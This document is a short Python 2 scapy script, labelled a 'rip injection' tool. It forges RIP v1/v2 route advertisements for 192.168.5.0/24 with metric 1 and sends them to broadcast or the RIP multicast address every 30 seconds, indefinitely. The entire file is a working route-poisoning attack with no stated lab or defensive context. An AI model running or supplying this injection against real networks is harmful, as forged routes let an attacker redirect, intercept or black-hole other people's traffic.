#!/usr/bin/env python

import os
import sys
import time
import signal

from scapy.layers.inet import IP, UDP
from scapy.layers.rip import RIP, RIPEntry
from scapy.sendrecv import send

def genPacketRipV1( _ip, _metric ):
    packet = IP(dst='255.255.255.255')/UDP(
        sport=520, dport=520)/RIP(cmd=2, version=1)/RIPEntry(AF=2, addr=_ip, metric=_metric)
    return packet

def genPacketRipV2( _ip, _metric, _mask ):
    packet = IP(dst='224.0.0.9')/UDP(
        sport=520, dport=520)/RIP(cmd=2,version=2)/RIPEntry(
            AF=2, RouteTag=0, addr=_ip, mask=_mask, nextHop='0.0.0.0', metric=_metric)
    return packet

def main():
    print 'Starting rip injection PID', os.getpid()

    _ip = '192.168.5.0'
    _metric = 1
    _mask = '255.255.255.0'

    #pkt = genPacketRipV1( _ip, _metric )
    pkt = genPacketRipV2( _ip, _metric, _mask )

    while True:
        send(pkt)
        time.sleep(30)

main()